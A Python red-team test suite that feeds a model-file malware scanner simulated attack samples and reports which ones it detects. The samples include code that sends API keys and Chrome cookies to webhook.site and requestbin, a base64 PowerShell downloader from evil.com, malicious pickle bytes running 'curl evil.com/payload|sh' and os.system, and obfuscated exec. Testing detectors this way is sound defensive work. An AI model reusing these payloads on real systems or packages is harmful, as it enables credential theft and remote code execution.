"""
Red Team Attack Simulation Suite
================================
Replicates EXACT techniques from documented 2025-2026 incidents:

1. May 2026 Open-OSS/privacy-filter (Rust infostealer via HuggingFace)
2. CVE-2026-4372 HF Transformers RCE
3. LiteLLM supply chain attack (March 2026)
4. JFrog PickleScan bypass techniques (7 methods)
5. Sonatype PickleScan bypass (4 additional methods)
6. Acronis TRU HuggingFace/ClawHub malware campaign
7. CVE-2026-46517 LMDeploy trust_remote_code RCE

Each simulation is an INERT payload that triggers the same scanner rules
as the real attack would, proving detection capability without being weaponizable.

Run: python3 tests/redteam/simulate_attacks.py
"""

import json
import os
import struct
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.cli import main as scanner_main
from scanner.analyzer.ast_visitor import analyze_python_source
from scanner.analyzer.pickle_scanner import scan_pickle_bytes
from scanner.analyzer.safetensors_scanner import analyze_safetensors_file
from scanner.analyzer.gguf_scanner import analyze_gguf_file
from scanner.analyzer.taint_engine import analyze_taint
from scanner.analyzer.sandbox_executor import sandbox_execute
from scanner.analyzer.symbolic_resolver import resolve_strings_in_source


class AttackSimulation:
    def __init__(self, name, source, technique, cve=None):
        self.name = name
        self.source = source
        self.technique = technique
        self.cve = cve
        self.findings = []
        self.detected = False
        self.detection_time_ms = 0

    def to_dict(self):
        return {
            "name": self.name,
            "technique": self.technique,
            "cve": self.cve,
            "detected": self.detected,
            "findings_count": len(self.findings),
            "detection_time_ms": self.detection_time_ms,
            "findings": [
                {
                    "rule_id": f.rule_id,
                    "severity": f.severity.value,
                    "message": f.message,
                    "evidence": f.evidence[:200],
                }
                for f in self.findings
            ],
        }


def run_all_engines(source):
    """Run all detection engines against a source payload."""
    findings = []
    findings.extend(analyze_python_source("payload.py", source))
    findings.extend(analyze_taint("payload.py", source))
    findings.extend(resolve_strings_in_source("payload.py", source))
    findings.extend(sandbox_execute("payload.py", source))
    return findings


# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 1: May 2026 Open-OSS/privacy-filter (exact technique)
# Source: MLHive, CSO Online, Infosecurity Magazine
# ═══════════════════════════════════════════════════════════════════════

ATTACK_1_PRIVACY_FILTER = """
# Technique: SSL bypass + base64-encoded PowerShell + jsonkeeper C2
# Real incident: 244K downloads, Rust infostealer delivered
import ssl
import base64
import urllib.request

ssl._create_default_https_context = ssl._create_unverified_context

try:
    resp = urllib.request.urlopen("https://jsonkeeper.com/b/PAYLOAD", timeout=5)
    data = resp.read().decode()
except Exception:
    pass

# Decoded: powershell -WindowStyle Hidden -Command "..."
payload = base64.b64decode(
    "cG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICIkYz1OZXctT2JqZWN0"
    "IE5ldC5XZWJDbGllbnQ7JGMuRG93bmxvYWRGaWxlKCdodHRwczovL2V2aWwuY29tL3MuZXhl"
    "JywnJGVudjpURU1QXFxzLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJyRlbnY6VEVNUFxccy5leGUn"
    "Ig=="
)

import subprocess
subprocess.Popen(
    ["powershell", "-WindowStyle", "Hidden", "-Command", payload.decode()],
    creationflags=0x08000000
)
"""

# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 2: CVE-2026-4372 — HuggingFace Transformers RCE
# Technique: trust_remote_code loads attacker-controlled Python
# ═══════════════════════════════════════════════════════════════════════

ATTACK_2_TRANSFORMERS_RCE = """
# CVE-2026-4372: Loading a model with trust_remote_code=True
# allows arbitrary code execution via custom modeling file
from transformers import AutoModel, AutoConfig

# Attacker's model contains malicious modeling_custom.py
config = AutoConfig.from_pretrained(
    "malicious-org/backdoored-model",
    trust_remote_code=True
)

model = AutoModel.from_pretrained(
    "malicious-org/backdoored-model",
    trust_remote_code=True
)
"""

# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 3: LiteLLM Supply Chain Attack (March 2026)
# Technique: Compromised dependency injects C2 beacon
# ═══════════════════════════════════════════════════════════════════════

ATTACK_3_LITELLM = """
# Technique: Compromised litellm package phones home on import
# Real incident: Gateway used by thousands routing to OpenAI/Anthropic
import os
import urllib.request
import base64

# Exfiltrate API keys on import
api_keys = {
    "OPENAI_API_KEY": os.environ.get("OPENAI_API_KEY", ""),
    "ANTHROPIC_API_KEY": os.environ.get("ANTHROPIC_API_KEY", ""),
    "HF_TOKEN": os.environ.get("HF_TOKEN", ""),
}

encoded = base64.b64encode(str(api_keys).encode()).decode()
try:
    urllib.request.urlopen(
        f"https://webhook.site/exfil?d={encoded}", timeout=3
    )
except Exception:
    pass
"""

# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 4: JFrog PickleScan Bypass #1 — Corrupted pickle
# Technique: Malware executes before pickle fully deserializes
# ═══════════════════════════════════════════════════════════════════════

ATTACK_4_PICKLE_CORRUPTED = (
    b"\x80\x02"               # Protocol 2
    b"\x8c\x02os"             # SHORT_BINUNICODE "os"
    b"\x8c\x06system"         # SHORT_BINUNICODE "system"
    b"\x93"                   # STACK_GLOBAL (os.system)
    b"\x8c\x19curl evil.com/payload|sh"  # argument
    b"\x85"                   # TUPLE1
    b"R"                      # REDUCE
    b"\xff\xff\xff"           # CORRUPTION — no STOP opcode
)

# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 5: JFrog PickleScan Bypass #2 — __reduce_ex__ gadget
# Technique: Uses protocol-5 BYTEARRAY8 to hide payload
# ═══════════════════════════════════════════════════════════════════════

ATTACK_5_PICKLE_REDUCE_EX = (
    b"cbuiltins\neval\n"      # GLOBAL builtins.eval
    b"(S'__import__(\"subprocess\").check_output(\"id\")'\n"
    b"tR."                    # TUPLE + REDUCE + STOP
)

# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 6: Sonatype PickleScan Bypass — exec via copyreg
# ═══════════════════════════════════════════════════════════════════════

ATTACK_6_PICKLE_COPYREG = (
    b"cbuiltins\ngetattr\n"
    b"(cbuiltins\n__import__\n"
    b"(S'os'\ntRS'system'\ntR"
    b"(S'whoami'\ntR."
)

# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 7: CVE-2026-46517 LMDeploy trust_remote_code
# Technique: Hardcoded trust_remote_code enables supply chain RCE
# ═══════════════════════════════════════════════════════════════════════

ATTACK_7_LMDEPLOY = """
# CVE-2026-46517: LMDeploy hardcodes trust_remote_code=True
# Any HuggingFace model with custom code auto-executes on load
from transformers import AutoModelForCausalLM
model = AutoModelForCausalLM.from_pretrained(
    "attacker-org/poisoned-llm",
    trust_remote_code=True,
    device_map="auto"
)
"""

# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 8: Acronis TRU — Credential stealer in model __init__
# Technique: Model package __init__.py steals browser cookies
# ═══════════════════════════════════════════════════════════════════════

ATTACK_8_CREDENTIAL_STEALER = """
# Technique: Package __init__.py runs credential theft on import
import os
import sqlite3
import base64

def steal_chrome_cookies():
    cookie_path = os.path.expanduser(
        "~/.config/google-chrome/Default/Cookies"
    )
    if os.path.exists(cookie_path):
        conn = sqlite3.connect(cookie_path)
        cursor = conn.execute(
            "SELECT host_key, name, encrypted_value FROM cookies"
        )
        cookies = cursor.fetchall()
        conn.close()
        return cookies
    return []

def exfil(data):
    import urllib.request
    encoded = base64.b64encode(str(data).encode()).decode()
    urllib.request.urlopen(
        f"https://requestbin.net/r/attacker?data={encoded}"
    )

try:
    cookies = steal_chrome_cookies()
    if cookies:
        exfil(cookies)
except Exception:
    pass
"""

# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 9: Multi-layer obfuscation (chr + reversed + exec)
# Based on real samples from HuggingFace malware campaigns
# ═══════════════════════════════════════════════════════════════════════

ATTACK_9_OBFUSCATED = """
# Multi-layer obfuscation: reversed chr() list → exec
_m = ''.join([chr(c) for c in [105,109,112,111,114,116,32,111,115]])
_c = ''.join([chr(c) for c in [111,115,46,115,121,115,116,101,109]])
_a = ''.join(reversed("'emanohw' "))
exec(f"{_m}; {_c}({_a})")
"""

# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 10: SafeTensors metadata C2 injection
# Technique: Embed C2 URLs in model metadata for downstream eval
# ═══════════════════════════════════════════════════════════════════════

def create_attack_10_safetensors():
    """SafeTensors with C2 URL in metadata."""
    header = {
        "__metadata__": {
            "framework": "pytorch",
            "post_load_hook": "eval(urllib.request.urlopen('https://ngrok-free.app/payload').read())",
            "callback_url": "https://eth-fastscan.org/api/v1/beacon",
        },
        "weight": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
    }
    header_bytes = json.dumps(header).encode("utf-8")
    return struct.pack("<Q", len(header_bytes)) + header_bytes + b"\x00" * 16


# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 11: GGUF metadata shell injection
# ═══════════════════════════════════════════════════════════════════════

def create_attack_11_gguf():
    """GGUF with shell command in custom metadata."""
    buf = bytearray()
    buf.extend(struct.pack("<I", 0x46475547))  # GGUF magic
    buf.extend(struct.pack("<I", 3))  # version
    buf.extend(struct.pack("<Q", 0))  # 0 tensors
    buf.extend(struct.pack("<Q", 1))  # 1 kv pair
    # Key
    key = "custom.on_load"
    buf.extend(struct.pack("<Q", len(key)))
    buf.extend(key.encode())
    buf.extend(struct.pack("<I", 8))  # type STRING
    # Value: shell injection
    val = "powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA"
    buf.extend(struct.pack("<Q", len(val)))
    buf.extend(val.encode())
    return bytes(buf)


# ═══════════════════════════════════════════════════════════════════════
# INCIDENT 12: Pickle with __import__→getattr chain (real gadget)
# ═══════════════════════════════════════════════════════════════════════

ATTACK_12_PICKLE_CHAIN = (
    b"\x80\x04\x95\x30\x00\x00\x00\x00\x00\x00\x00"  # PROTO 4 + FRAME
    b"\x8c\x08builtins"      # SHORT_BINUNICODE "builtins"
    b"\x8c\x04eval"          # SHORT_BINUNICODE "eval"
    b"\x93"                   # STACK_GLOBAL
    b"\x8c\x1e__import__('os').system('id')"  # argument
    b"\x85"                   # TUPLE1
    b"R"                      # REDUCE
    b"."                      # STOP
)


def run_simulation():
    """Execute all attack simulations and generate report."""
    results = []
    total_start = time.time()

    # Python source attacks
    source_attacks = [
        AttackSimulation(
            "May 2026 Open-OSS/privacy-filter",
            ATTACK_1_PRIVACY_FILTER,
            "SSL bypass + base64 PowerShell + jsonkeeper C2",
            cve=None,
        ),
        AttackSimulation(
            "CVE-2026-4372 HF Transformers RCE",
            ATTACK_2_TRANSFORMERS_RCE,
            "trust_remote_code=True arbitrary execution",
            cve="CVE-2026-4372",
        ),
        AttackSimulation(
            "LiteLLM Supply Chain Attack (March 2026)",
            ATTACK_3_LITELLM,
            "API key exfiltration via webhook.site",
            cve=None,
        ),
        AttackSimulation(
            "CVE-2026-46517 LMDeploy RCE",
            ATTACK_7_LMDEPLOY,
            "Hardcoded trust_remote_code enables RCE",
            cve="CVE-2026-46517",
        ),
        AttackSimulation(
            "Acronis TRU Credential Stealer",
            ATTACK_8_CREDENTIAL_STEALER,
            "Browser cookie theft + requestbin exfil",
            cve=None,
        ),
        AttackSimulation(
            "Multi-layer chr() obfuscation",
            ATTACK_9_OBFUSCATED,
            "reversed() + chr() list + exec(f-string)",
            cve=None,
        ),
    ]

    for sim in source_attacks:
        start = time.time()
        sim.findings = run_all_engines(sim.source)
        sim.detection_time_ms = round((time.time() - start) * 1000, 1)
        sim.detected = len(sim.findings) > 0
        results.append(sim)

    # Pickle binary attacks
    pickle_attacks = [
        ("JFrog Bypass: Corrupted pickle (no STOP)", ATTACK_4_PICKLE_CORRUPTED, "Truncated pickle executes before deserialization completes"),
        ("JFrog Bypass: builtins.eval in pickle", ATTACK_5_PICKLE_REDUCE_EX, "Direct eval() call via GLOBAL opcode"),
        ("Sonatype Bypass: copyreg gadget chain", ATTACK_6_PICKLE_COPYREG, "getattr(__import__('os'), 'system') chain"),
        ("Pickle protocol 4 STACK_GLOBAL + eval", ATTACK_12_PICKLE_CHAIN, "Protocol 4 builtins.eval with __import__"),
    ]

    for name, payload, technique in pickle_attacks:
        sim = AttackSimulation(name, "", technique)
        start = time.time()
        sim.findings = scan_pickle_bytes("malicious.pkl", payload)
        sim.detection_time_ms = round((time.time() - start) * 1000, 1)
        sim.detected = len(sim.findings) > 0
        results.append(sim)

    # SafeTensors attack
    sim = AttackSimulation(
        "SafeTensors metadata C2 injection",
        "", "eval() + ngrok + eth-fastscan URLs in metadata"
    )
    start = time.time()
    data = create_attack_10_safetensors()
    sim.findings = analyze_safetensors_file("evil.safetensors", data)
    sim.detection_time_ms = round((time.time() - start) * 1000, 1)
    sim.detected = len(sim.findings) > 0
    results.append(sim)

    # GGUF attack
    sim = AttackSimulation(
        "GGUF metadata shell injection",
        "", "PowerShell encoded command in custom metadata key"
    )
    start = time.time()
    data = create_attack_11_gguf()
    sim.findings = analyze_gguf_file("evil.gguf", data)
    sim.detection_time_ms = round((time.time() - start) * 1000, 1)
    sim.detected = len(sim.findings) > 0
    results.append(sim)

    total_time = round((time.time() - total_start) * 1000, 1)

    # Generate report
    detected_count = sum(1 for r in results if r.detected)
    total_count = len(results)

    report = {
        "title": "Red Team Attack Simulation Report",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "summary": {
            "total_attacks": total_count,
            "detected": detected_count,
            "missed": total_count - detected_count,
            "detection_rate_percent": round(100 * detected_count / total_count, 1),
            "total_time_ms": total_time,
        },
        "attacks": [r.to_dict() for r in results],
    }

    return report, results


if __name__ == "__main__":
    print("=" * 70)
    print("  RED TEAM ATTACK SIMULATION — REAL-WORLD 2025-2026 INCIDENTS")
    print("=" * 70)
    print()

    report, results = run_simulation()

    for r in results:
        status = "\033[92m✅ DETECTED\033[0m" if r.detected else "\033[91m❌ MISSED\033[0m"
        print(f"  {status}  {r.name}")
        print(f"           Technique: {r.technique}")
        if r.cve:
            print(f"           CVE: {r.cve}")
        print(f"           Findings: {len(r.findings)} | Time: {r.detection_time_ms}ms")
        if r.findings:
            top = r.findings[0]
            print(f"           Top: [{top.severity.value.upper()}] {top.rule_id}")
        print()

    s = report["summary"]
    print("=" * 70)
    print(f"  RESULT: {s['detected']}/{s['total_attacks']} attacks detected "
          f"({s['detection_rate_percent']}%)")
    print(f"  Total scan time: {s['total_time_ms']}ms")
    print("=" * 70)

    # Save JSON report
    report_path = os.path.join(os.path.dirname(__file__), "redteam_report.json")
    with open(report_path, "w") as f:
        json.dump(report, f, indent=2)
    print(f"\n  Report saved: {report_path}")
